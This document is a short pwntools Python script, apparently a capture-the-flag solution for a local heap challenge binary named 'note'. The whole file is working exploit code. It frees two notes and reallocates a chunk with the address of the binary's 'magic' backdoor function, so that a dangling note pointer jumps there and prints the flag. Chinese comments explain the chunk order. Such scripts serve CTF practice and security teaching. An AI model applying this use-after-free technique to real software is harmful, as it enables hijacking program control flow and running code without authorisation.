from pwn import *

'''

# author : lemon
# 2020-09-17
# python 3.8.2
# libc version:libc-2.23.so

'''


local = 1

if local == 1:
	p = process('./note')

elf = ELF('./note')

def dbg():
	context.log_level = 'debug'

def add(size,content):
	p.sendlineafter("Your choice :",'1')
	p.sendlineafter('Note size :',str(size))
	p.sendafter('Content :',content)

def free(index):
	p.sendlineafter("Your choice :",'2')
	p.sendlineafter('Index :',str(index))

def show(index):
	p.sendlineafter("Your choice :",'3')
	p.sendlineafter('Index :',str(index))

#dbg()
add(0x20,'aaaaaaaa') #chunk_control0+chunk_data0
add(0x20,'AAAAAAAA') #chunk_control1+chunk_data1
#这里的0x20可以随便改，只要大于等于0x19即可，两个0x20也可以不一样。

free(0)
free(1)
#free顺序:chunk_data0,chunk_control0,chunk_data1,chunk_control1

backdoor = p64(elf.sym['magic'])
add(0x10,backdoor)
#malloc顺序:chunk_controlA=chunk_control1,chunk_dataA=chunk_control0

show(0)
print(p.recv())
#获取flag




